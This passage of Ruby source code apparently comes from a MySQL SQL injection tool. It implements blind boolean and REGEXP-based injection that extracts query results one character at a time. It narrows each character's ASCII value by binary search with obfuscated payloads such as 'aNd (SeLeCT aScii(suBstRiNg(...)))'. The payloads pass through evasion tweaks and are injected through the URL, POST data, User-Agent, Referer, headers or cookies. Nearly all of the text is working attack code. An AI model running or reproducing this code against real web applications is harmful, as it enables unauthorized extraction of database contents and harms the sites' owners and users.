                    $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
                  end
                  if $config['INJECTOR']['MYSQL']['DATA'].nil?
                    res = @http.get($config['INJECTOR']['MYSQL']['URL'])
                  else
                    res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
                  end
                  if turn_off
                    $config['HTTP']['HTTP_HEADERS_ADD'] = false
                  end
                  $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                    $config['HTTP']['HTTP_HEADERS'].delete(k)
                  end
                end
                if res[0] == @true
                  starts = 150
                  ends = 201
                else
                  starts = 200
                  ends = 255
                end
              end
            end
          end

          # Try to cut the range from 50 to 25 now
          inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<#{ends - 25})"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] == @true
            ends = ends - 25
          else
            starts = ends - 25
          end

          # Try to cut the range from 25 to 10 or 15 now
          inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))<#{ends - 10})"
          t = @tweak.tamper(inj)
          t2 = @tweak.space(t)
          injection_str = @tweak.comma(t2)
          case $config['INJECTOR']['MYSQL']['LOC']
          when 'URL'
            if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
              injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.get(injection)
            else # POST
              injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
              injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
              res = @http.post(injection_url, injection_data)
            end
          when 'UA'
            original_ua = $config['HTTP']['HTTP_USER_AGENT']
            $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['HTTP_USER_AGENT'] = original_ua
          when 'REF'
            original_ref = $config['HTTP']['REFERER']
            $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            $config['HTTP']['REFERER'] = original_ref
          when 'HEADER'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          when 'COOKIE'
            if not $config['HTTP']['HTTP_HEADERS_ADD']
              turn_off=true
              $config['HTTP']['HTTP_HEADERS_ADD'] = true
            end
            $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
            end
            if $config['INJECTOR']['MYSQL']['DATA'].nil?
              res = @http.get($config['INJECTOR']['MYSQL']['URL'])
            else
              res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
            end
            if turn_off
              $config['HTTP']['HTTP_HEADERS_ADD'] = false
            end
            $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
              $config['HTTP']['HTTP_HEADERS'].delete(k)
            end
          end
          if res[0] == @true
            ends = ends - 10
          else
            starts = ends - 10
          end

          # Not Done Yet, but almost....
          pad = ' ' * 20
          while(starts.to_i < ends.to_i)
            inj = " aNd (SeLeCT aScii(suBstRiNg((#{query}),#{char_position},1))=#{starts})"
            t = @tweak.tamper(inj)
            t2 = @tweak.space(t)
            injection_str = @tweak.comma(t2)
            case $config['INJECTOR']['MYSQL']['LOC']
            when 'URL'
              if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
                injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                res = @http.get(injection)
              else # POST
                injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
                injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
                res = @http.post(injection_url, injection_data)
              end
            when 'UA'
              original_ua = $config['HTTP']['HTTP_USER_AGENT']
              $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              $config['HTTP']['HTTP_USER_AGENT'] = original_ua
            when 'REF'
              original_ref = $config['HTTP']['REFERER']
              $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              $config['HTTP']['REFERER'] = original_ref
            when 'HEADER'
              if not $config['HTTP']['HTTP_HEADERS_ADD']
                turn_off=true
                $config['HTTP']['HTTP_HEADERS_ADD'] = true
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
              end
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              if turn_off
                $config['HTTP']['HTTP_HEADERS_ADD'] = false
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].delete(k)
              end
            when 'COOKIE'
              if not $config['HTTP']['HTTP_HEADERS_ADD']
                turn_off=true
                $config['HTTP']['HTTP_HEADERS_ADD'] = true
              end
              $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
              end
              if $config['INJECTOR']['MYSQL']['DATA'].nil?
                res = @http.get($config['INJECTOR']['MYSQL']['URL'])
              else
                res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
              end
              if turn_off
                $config['HTTP']['HTTP_HEADERS_ADD'] = false
              end
              $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
                $config['HTTP']['HTTP_HEADERS'].delete(k)
              end
            end
            if res[0] == @true
              results += starts.chr
              print "\r#{results.chomp}".cyan + pad
              char_position = char_position.to_i + 1
              break
            else
              print "\r#{results.chomp}".cyan + "#{starts.chr.chomp}".white + pad unless starts < 32 or starts > 126
              starts = starts.to_i + 1
            end
          end
        end
        puts "\n"
        return results
      end
    end
  end

  # Check to ensure data exists before dumping!
  def data_exists(query)
    case $config['INJECTOR']['MYSQL']['BLIND']['METHOD']
    when 'REGXP'
      inj = " and 1=(SELECT 1 REGEXP IF((select length( (#{query}) )>0),1,''))"
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)

      # Now place injection string in the right spot and send request
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end

      # Did we trigger conditional Regexp error?
      if res[0] =~ /empty \(sub\)expression/
        return false
      else
        return true
      end
    when 'BOOLEAN'
      r = rand(10000)
      sqli_true = " aNd #{r}=#{r}"
      t = @tweak.tamper(sqli_true)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end
      @true = res[0]

      # Make sure there is data in result
      inj = " aNd (SeLeCT leNgTh( (#{query}) )<0)"
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)
      case $config['INJECTOR']['MYSQL']['LOC']
      when 'URL'
        if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
          injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.get(injection)
        else # POST
          injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', injection_str.urienc).space2plus
          injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', injection_str.urienc).space2plus
          res = @http.post(injection_url, injection_data)
        end
      when 'UA'
        original_ua = $config['HTTP']['HTTP_USER_AGENT']
        $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['HTTP_USER_AGENT'] = original_ua
      when 'REF'
        original_ref = $config['HTTP']['REFERER']
        $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', injection_str.urienc).space2plus
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        $config['HTTP']['REFERER'] = original_ref
      when 'HEADER'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', injection_str.urienc).space2plus)
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      when 'COOKIE'
        if not $config['HTTP']['HTTP_HEADERS_ADD']
          turn_off=true
          $config['HTTP']['HTTP_HEADERS_ADD'] = true
        end
        $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', injection_str.urienc).space2plus}")
        end
        if $config['INJECTOR']['MYSQL']['DATA'].nil?
          res = @http.get($config['INJECTOR']['MYSQL']['URL'])
        else
          res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
        end
        if turn_off
          $config['HTTP']['HTTP_HEADERS_ADD'] = false
        end
        $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
          $config['HTTP']['HTTP_HEADERS'].delete(k)
        end
      end

      if res[0] == @true
        print_error("Result Length < 0?")
        print_error("Bogus Result Encountered!")
        return false
      end
      # Make sure there is not too much data in result
      inj = " aNd (SeLeCT leNgTh( (#{query}) )>1000000)"
      t = @tweak.tamper(inj)
      t2 = @tweak.space(t)
      injection_str = @tweak.comma(t2)

      # All signs point to data within?
      if res[0] == @true
        print_error("Result Length > 1,000,000?")
        print_error("Result Length Too Great to Attempt to Return!")
        return false
      end
      return true # Has data for us to get :)
    end
  end

  # Same as above but only checks if query returns true or false
  # returns true or false accordingly
  def blind_true_false_inject(query)
    #Establish True vs. False Base Comparison
    r=rand(10000)
    inj_true = " aNd #{r}=#{r}"
    t1=@tweak.tamper(inj_true)
    t2=@tweak.space(t1)
    true_injection_str=@tweak.comma(t2)

    # Now place injection string in the right spot and send request
    case $config['INJECTOR']['MYSQL']['LOC']
    when 'URL'
      if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
        injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', true_injection_str.urienc).space2plus
        res = @http.get(injection)
      else # POST
        injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', true_injection_str.urienc).space2plus
        injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', true_injection_str.urienc).space2plus
        res = @http.post(injection_url, injection_data)
      end

    when 'UA'
      original_ua = $config['HTTP']['HTTP_USER_AGENT']
      $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', true_injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['HTTP_USER_AGENT'] = original_ua

    when 'REF'
      original_ref = $config['HTTP']['REFERER']
      $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', true_injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['REFERER'] = original_ref

    when 'HEADER'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', true_injection_str.urienc).space2plus)
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end

    when 'COOKIE'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', true_injection_str.urienc).space2plus}")
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end
    end
    @true = res[0] # Our baseline TRUE response

    # Now inject and compare....
    inj_false = " aNd 1=(#{query})"
    t1=@tweak.tamper(inj_false)
    t2=@tweak.space(t1)
    false_injection_str=@tweak.comma(t2)
    case $config['INJECTOR']['MYSQL']['LOC']
    when 'URL'
      if $config['INJECTOR']['MYSQL']['DATA'].nil? # GET
        injection = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', false_injection_str.urienc).space2plus
        res = @http.get(injection)
      else # POST
        injection_url  = $config['INJECTOR']['MYSQL']['URL'].sub('_SQLI_', false_injection_str.urienc).space2plus
        injection_data = $config['INJECTOR']['MYSQL']['DATA'].sub('_SQLI_', false_injection_str.urienc).space2plus
        res = @http.post(injection_url, injection_data)
      end

    when 'UA'
      original_ua = $config['HTTP']['HTTP_USER_AGENT']
      $config['HTTP']['HTTP_USER_AGENT'] = $config['INJECTOR']['MYSQL']['UA'].sub('_SQLI_', false_injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['HTTP_USER_AGENT'] = original_ua

    when 'REF'
      original_ref = $config['HTTP']['REFERER']
      $config['HTTP']['REFERER'] = $config['INJECTOR']['MYSQL']['REF'].sub('_SQLI_', false_injection_str.urienc).space2plus
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      $config['HTTP']['REFERER'] = original_ref

    when 'HEADER'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store(k, v.sub('_SQLI_', false_injection_str.urienc).space2plus)
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end

    when 'COOKIE'
      if not $config['HTTP']['HTTP_HEADERS_ADD']
        turn_off=true
        $config['HTTP']['HTTP_HEADERS_ADD'] = true
      end
      $config['INJECTOR']['MYSQL']['COOKIES'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].store('COOKIE', "#{k}=#{v.sub('_SQLI_', false_injection_str.urienc).space2plus}")
      end
      if $config['INJECTOR']['MYSQL']['DATA'].nil?
        res = @http.get($config['INJECTOR']['MYSQL']['URL'])
      else
        res = @http.post($config['INJECTOR']['MYSQL']['URL'], $config['INJECTOR']['MYSQL']['DATA'])
      end
      if turn_off
        $config['HTTP']['HTTP_HEADERS_ADD'] = false
      end
      $config['INJECTOR']['MYSQL']['HEADERS'].each do |k, v|
        $config['HTTP']['HTTP_HEADERS'].delete(k)
      end
    end

    if res[0] == @true
      return true
    else
      return false
    end
  end
end
